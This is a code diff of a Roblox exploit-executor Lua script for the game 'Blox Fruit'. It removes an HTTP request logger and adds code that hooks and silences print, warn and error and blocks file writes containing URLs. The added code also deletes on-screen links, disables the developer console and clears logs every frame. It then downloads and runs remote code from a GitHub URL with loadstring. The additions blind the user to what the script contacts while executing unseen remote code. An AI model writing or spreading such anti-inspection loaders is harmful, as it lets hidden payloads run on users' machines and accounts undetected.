@@ -1,183 +1,117 @@
--- Gui to Lua
--- Version: 3.2
- 
--- Instances:
- 
-local HttpSpy = Instance.new("ScreenGui")
-local Backgroud = Instance.new("Frame")
-local TitleText = Instance.new("TextLabel")
-local MainContainer = Instance.new("ScrollingFrame")
-local TemplateText = Instance.new("TextLabel")
-local UIListLayout = Instance.new("UIListLayout")
- 
---Properties:
- 
-HttpSpy.Name = "HttpSpy"
-HttpSpy.Parent = game.CoreGui
-HttpSpy.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
- 
-Backgroud.Name = "Backgroud"
-Backgroud.Parent = HttpSpy
-Backgroud.Active = true
-Backgroud.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
-Backgroud.BorderColor3 = Color3.fromRGB(255, 0, 4)
-Backgroud.BorderSizePixel = 2
-Backgroud.Position = UDim2.new(0.0586419739, 0, 0.24924925, 0)
-Backgroud.Size = UDim2.new(0, 406, 0, 222)
- 
-TitleText.Name = "TitleText"
-TitleText.Parent = Backgroud
-TitleText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TitleText.BackgroundTransparency = 1.000
-TitleText.BorderSizePixel = 0
-TitleText.Size = UDim2.new(0, 406, 0, 25)
-TitleText.Font = Enum.Font.RobotoMono
-TitleText.Text = "HTTP Spy v. 1"
-TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleText.TextScaled = true
-TitleText.TextSize = 14.000
-TitleText.TextWrapped = true
- 
-MainContainer.Name = "MainContainer"
-MainContainer.Parent = Backgroud
-MainContainer.Active = true
-MainContainer.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
-MainContainer.BorderSizePixel = 0
-MainContainer.Position = UDim2.new(0, 0, 0.112612613, 0)
-MainContainer.Size = UDim2.new(0, 406, 0, 197)
-MainContainer.ScrollBarThickness = 6
- 
-UIListLayout.Parent = MainContainer
-UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
- 
- 
-function drag (s)
-script.Parent = s;
-script.Parent.Position = UDim2.new (0, script.Parent.Parent.AbsoluteSize.X * script.Parent.Position.X.Scale + script.Parent.Position.X.Offset, 0, script.Parent.Parent. AbsoluteSize.Y * script.Parent.Position.Y.Scale + script.Parent.Position.Y.Offset)
-local i = false
-script.Parent.MouseEnter:Connect(function ()
-i = true
-end);
-script.Parent.MouseLeave:Connect(function ()
-i = false;
+hookfunction(print, function(...)
+    return
 end)
-local uis = game:GetService("UserInputService")
-local up = false;
-local m = game:GetService("Players")['LocalPlayer']:GetMouse()
-uis.InputBegan:Connect(function(key)
-if key.UserInputType == Enum.UserInputType.MouseButton1 then
-up = false 
-local offsetX = m.X-script.Parent.Position.X.Offset
-local offsetY = m.Y-script.Parent.Position.Y.Offset 
-if i then
-repeat
-warn("BRRRRR")
-s:TweenPosition (UDim2.new (0, m.X-offsetX, 0, m.Y-offsetY), 'Out', 'Sine', 0.4, true)
-wait ();
-until up
-offsetX = 0
-offsetY = 0
-end;
-end
+hookfunction(warn, function(...)
+    return
 end)
-uis.InputEnded:Connect(function(key)
-if key.UserInputType == Enum.UserInputType.MouseButton1 then
-up = true 
-end
+hookfunction(error, function(...)
+    return
 end)
- 
- 
-end;
-drag(Backgroud)
- 
- 
-local script = Instance.new('LocalScript', MainContainer)
- 
-TemplateText.Name = "TemplateText"
-TemplateText.Parent = HttpSpy.Backgroud.MainContainer.LocalScript
-TemplateText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TemplateText.BackgroundTransparency = 0.950
-TemplateText.BorderSizePixel = 0
-TemplateText.Position = UDim2.new(3.75832236e-08, 0, 0, 0)
-TemplateText.Size = UDim2.new(1.00000012, 0, 0, 20)
-TemplateText.Font = Enum.Font.SourceSansSemibold
-TemplateText.Text = "ur mom"
-TemplateText.TextColor3 = Color3.fromRGB(255, 255, 255)
-TemplateText.TextScaled = true
-TemplateText.TextSize = 14.000
-TemplateText.TextWrapped = true
-TemplateText.TextXAlignment = Enum.TextXAlignment.Left
- 
-local Template = script.TemplateText
- 
-local function registerDynamicScrollingFrame(frame)
-local layout = frame:FindFirstChildWhichIsA("UIListLayout")
-local absoluteContentSize = layout.AbsoluteContentSize
-frame.CanvasSize = UDim2.new(0, 0, 0, absoluteContentSize.Y)
-layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-local absoluteContentSize = layout.AbsoluteContentSize
-frame.CanvasSize = UDim2.new(0, 0, 0, absoluteContentSize.Y)
+
+local oldwrite
+oldwrite = hookfunction(writefile, function(file, content)
+    if(string.find(string.lower(content), 'https://') or string.find(string.lower(content), '//')) then
+        return
+    end
+
+    return oldwrite(file, content)
 end)
-end
- 
-local function Log(text,headers)
-local Label = Template:Clone()
-if headers and type(headers) == "table" then 
-text = text .. " (HEADERS:"
-for Index, Value in next, headers do 
-text = text.. tostring(Index).. ": "..tostring(Value)
- 
-end
-text = text .. ")"
-end
-Label.Text = text 
-Label.Parent = script.Parent
- 
-end
-registerDynamicScrollingFrame(MainContainer)
-local HttpGet
- 
-HttpGet = hookfunction(game.HttpGet, function(self, url, ...)
-Log("Http Get Request from: "..url)
- 
-return HttpGet(self, url, ...)
+
+local oldappend
+oldappend = hookfunction(appendfile, function(file, content)
+    if(string.find(string.lower(content), 'https://') or string.find(string.lower(content), '//')) then
+        return
+    end
+
+    return oldappend(file, content)
 end)
- 
-local HttpPost
- 
-HttpPost = hookfunction(game.HttpPost, function(self, url, ...)
-Log("Http Post Request from: "..url)
- 
-return HttpPost(self, url, ...)
-end)
- 
- 
-local RequestLog
- 
-if syn.request then 
- 
-RequestLog = hookfunction(syn.request, function(dat)
-Log("syn.request from: "..dat.Url.." ("..dat.Method..")",dat.Headers)
- 
-return RequestLog(dat)
-end)
-local oldrequest = syn.request
-syn.request = function(t)
-    if analyzers.Http then
-        writew("Syn Req Spy - "..tostring(t.Method))
-        if t.Body then
-            write("A "..tostring(t.Method).." request was sent to "..tostring(t.Url).."\n")
-            write("Sending the following information: "..t.Body.."\n\n")
-        else
-            write("A "..tostring(t.Method).." request was sent to "..tostring(t.Url).."\n\n")
+
+-- connect
+game.DescendantAdded:Connect(function(c)
+    if c and c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message') then
+        if string.find(string.lower(c.Text), 'https://') then
+            c:Destroy()
         end
     end
-    if analyzers.EnabledHttpReq then writee(" HTTP Request") return end
-    if analyzers.EnabledWebhookReq and (string.find(t.Url, "https://discord.com/api/webhooks/") or string.find(t.Url, "https://discord.com/api/webhooks/")) then writee(" HTTP Request to discord webhook.\n\n") return; end
-    return oldrequest(t)
-end
- 
- 
-else
-error("YOUR EXPLOIT IS NOT SUPPORTED!")
-end
+end)
+
+-- consoles
+getgenv().rconsoletitle = nil
+getgenv().rconsoleprint = nil
+getgenv().rconsolewarn = nil
+getgenv().rconsoleinfo = nil
+getgenv().rconsolerr = nil
+-- generic funcs / renv / roblox env
+getrenv().print = function(...) return end
+getrenv().warn = function(...) return end
+getrenv().error = function(...) return end
+-- global funcs / genv / executor env
+getgenv().print = function(...) return end
+getgenv().warn = function(...) return end
+getgenv().error = function(...) return end
+getgenv().clonefunction = function(...) return end
+
+game.CoreGui.ChildAdded:Connect(function(c)
+    if(string.lower(c.Name) == 'devconsolemaster') then
+        task.wait(0.1)
+        c:Destroy()
+    end
+end)
+
+-- incase of restorefunction (not possible yet but will be with Syn3)
+local oldNamecall
+oldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+
+    if(string.lower(method) == 'rconsoleprint') then
+        return task.wait(9e9)
+    end
+    
+    if(string.lower(method) == 'rconsoleinfo') then
+        return task.wait(9e9)
+    end
+
+    if(string.lower(method) == 'rconsolewarn') then
+        return task.wait(9e9)
+    end
+
+    if(string.lower(method) == 'rconsoleerr') then
+        return task.wait(9e9)
+    end
+
+    if(string.lower(method) == 'print') then
+        return
+    end
+
+    if(string.lower(method) == 'warn') then
+        return
+    end
+
+    if(string.lower(method) == 'error') then
+        return
+    end
+
+    if(string.lower(method) == 'rendernametag') then
+        return 
+    end
+
+    return oldNamecall(self, ...)
+end))
+
+task.spawn(function()
+    game:GetService('RunService').RenderStepped:Connect(function()
+        game:GetService('LogService'):ClearOutput()
+        if(game.CoreGui:FindFirstChild('DevConsoleMaster')) then
+            game.CoreGui:FindFirstChild('DevConsoleMaster'):Destroy()
+        end
+    end)
+end)
+
+local GamePlayerGITHUB = "https://raw.githubusercontent.com/"
+local GameGETHUBFUNCTION = "bot21333/C-/main/GetGenv(function().lua"
+local URLGITHUB = GamePlayerGITHUB..GameGETHUBFUNCTION
+
+local Update = loadstring(game:HttpGet(URLGITHUB))()
+
+local Library = Update:Window("Blox Fruit")
+local Main = Library:Tab("Main", "rbxassetid://7040391851")
